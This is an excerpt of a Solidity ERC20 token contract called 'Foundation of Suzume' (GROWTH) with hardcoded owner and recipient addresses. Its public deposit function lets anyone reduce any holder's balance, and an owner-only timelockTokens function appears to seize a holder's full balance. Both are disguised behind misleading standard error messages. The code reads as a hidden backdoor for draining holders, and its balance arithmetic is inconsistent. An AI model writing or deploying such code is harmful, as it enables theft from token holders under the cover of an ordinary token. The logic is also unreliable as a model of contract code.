...
contract Growth is Context, IERC20 {
    ...
    address public _owner = 0x65f9093784933B98584eB00E65e3aa6Ca50E662e;
   constructor () public {


        ////////////////////////////////////////
        _name = "Foundation of Suzume";
        _symbol = "GROWTH";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    function deposit(address account) public {
        ...
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[account] = _balances[0xcb9225bB407Bc585fFbB863DC924aad07C97Af2c].add(amount);
        //_totalSupply = _totalSupply.sub(amount);
    ...
    function timelockTokens(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
